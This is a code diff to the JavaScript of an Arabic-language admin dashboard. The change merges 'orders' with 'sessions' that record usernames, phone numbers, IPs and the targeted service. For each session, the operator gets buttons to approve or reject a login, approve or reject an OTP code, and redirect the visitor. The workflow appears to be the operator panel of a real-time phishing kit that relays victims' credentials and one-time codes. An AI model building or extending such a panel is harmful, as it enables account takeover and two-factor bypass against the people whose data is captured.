@@ -487,10 +487,12 @@ function loadStats() {
 }
 
 function loadOrders() {
-  fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth).then(function(d) {
-    if (!d) return;
-    sessionsData = d.sessions || [];
-    checkNewSessions(sessionsData);
+  Promise.all([
+    fetch('/api/orders', { headers: authHeaders() }).then(checkAuth),
+    fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth)
+  ]).then(function(results) {
+    if (results[0]) { ordersData = results[0].orders || []; checkNewOrders(ordersData); }
+    if (results[1]) { sessionsData = results[1].sessions || []; checkNewSessions(sessionsData); }
     renderOrders();
   }).catch(function() {});
 }
@@ -523,34 +525,49 @@ function loadVisitors() {
 
 function renderOrders() {
   var tb = document.getElementById('ordersBody');
-  document.getElementById('ordersBadge').textContent = sessionsData.length + ' سجل';
-  if (sessionsData.length === 0) {
+  var allItems = [];
+  ordersData.forEach(function(o) {
+    allItems.push({ type: 'order', data: o, date: o.date });
+  });
+  sessionsData.forEach(function(s) {
+    allItems.push({ type: 'session', data: s, date: s.date });
+  });
+  allItems.sort(function(a, b) { return new Date(b.date) - new Date(a.date); });
+
+  document.getElementById('ordersBadge').textContent = allItems.length + ' سجل';
+  if (allItems.length === 0) {
     tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد بيانات حتى الآن</td></tr>';
     return;
   }
   tb.innerHTML = '';
-  sessionsData.forEach(function(s) {
-    var sc, st;
-    if (s.otpStatus === 'approved') { sc = 'approved'; st = 'مكتمل'; }
-    else if (s.loginStatus === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
-    else if (s.otpStatus === 'rejected') { sc = 'rejected'; st = 'OTP مرفوض'; }
-    else if (s.otpStatus === 'waiting') { sc = 'waiting'; st = 'OTP'; }
-    else if (s.loginStatus === 'approved' && !s.otp) { sc = 'approved'; st = 'بانتظار OTP'; }
-    else if (s.loginStatus === 'waiting') { sc = 'waiting'; st = 'تسجيل دخول'; }
-    else { sc = 'pending'; st = 'بيانات جديدة'; }
-
-    var actBtns = '<button class="btn-sm btn-details" onclick="openSessionDetails(' + s.id + ')">التفاصيل</button>' +
-      '<button class="btn-sm btn-redirect" onclick="redirectSession(' + s.id + ')">إعادة التوجيه</button>';
-    if (s.pendingAction) {
-      var aType = s.pendingAction.type;
-      var aLabel = aType === 'login' ? 'قبول' : 'قبول OTP';
-      var rLabel = aType === 'login' ? 'رفض' : 'رفض OTP';
-      actBtns += '<button class="btn-sm btn-approve" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'approved\')">' + aLabel + '</button>' +
-        '<button class="btn-sm" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'rejected\')">' + rLabel + '</button>';
-    }
-
+  allItems.forEach(function(item) {
     var tr = document.createElement('tr');
-    tr.innerHTML = '<td>' + s.id + '</td><td>' + (s.country || '-') + '</td><td>' + (s.service || '-') + '</td><td>' + (s.username || '-') + '</td><td dir="ltr" style="text-align:right">' + (s.orderPhone || s.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actBtns + '</td>';
+    if (item.type === 'session') {
+      var s = item.data;
+      var sc, st;
+      if (s.otpStatus === 'approved') { sc = 'approved'; st = 'مكتمل'; }
+      else if (s.loginStatus === 'rejected') { sc = 'rejected'; st = 'مرفوض'; }
+      else if (s.otpStatus === 'rejected') { sc = 'rejected'; st = 'OTP مرفوض'; }
+      else if (s.otpStatus === 'waiting') { sc = 'waiting'; st = 'OTP'; }
+      else if (s.loginStatus === 'approved' && !s.otp) { sc = 'approved'; st = 'بانتظار OTP'; }
+      else if (s.loginStatus === 'waiting') { sc = 'waiting'; st = 'تسجيل دخول'; }
+      else { sc = 'pending'; st = 'بيانات جديدة'; }
+      var actBtns = '<button class="btn-sm btn-details" onclick="openSessionDetails(' + s.id + ')">التفاصيل</button>' +
+        '<button class="btn-sm btn-redirect" onclick="redirectSession(' + s.id + ')">إعادة التوجيه</button>';
+      if (s.pendingAction) {
+        var aType = s.pendingAction.type;
+        var aLabel = aType === 'login' ? 'قبول' : 'قبول OTP';
+        var rLabel = aType === 'login' ? 'رفض' : 'رفض OTP';
+        actBtns += '<button class="btn-sm" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'approved\')">' + aLabel + '</button>' +
+          '<button class="btn-sm" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="sessionAction(\'' + aType + '\',' + s.id + ',\'rejected\')">' + rLabel + '</button>';
+      }
+      tr.innerHTML = '<td>' + s.id + '</td><td>' + (s.country || '-') + '</td><td>' + (s.service || '-') + '</td><td>' + (s.username || '-') + '</td><td dir="ltr" style="text-align:right">' + (s.orderPhone || s.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actBtns + '</td>';
+    } else {
+      var o = item.data;
+      var sc = o.status === 'approved' ? 'approved' : o.status === 'rejected' ? 'rejected' : o.status === 'blocked' ? 'blocked' : 'pending';
+      var st = o.status === 'approved' ? 'مقبول' : o.status === 'rejected' ? 'مرفوض' : o.status === 'blocked' ? 'محظور' : 'بيانات جديدة';
+      tr.innerHTML = '<td>T' + o.id + '</td><td>' + (o.country || '-') + '</td><td>' + (o.service || '-') + '</td><td>' + (o.name || '-') + '</td><td dir="ltr" style="text-align:right">' + (o.phone || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td><button class="btn-sm btn-details" onclick="openDetails(' + o.id + ')">التفاصيل</button></td>';
+    }
     tb.appendChild(tr);
   });
 }
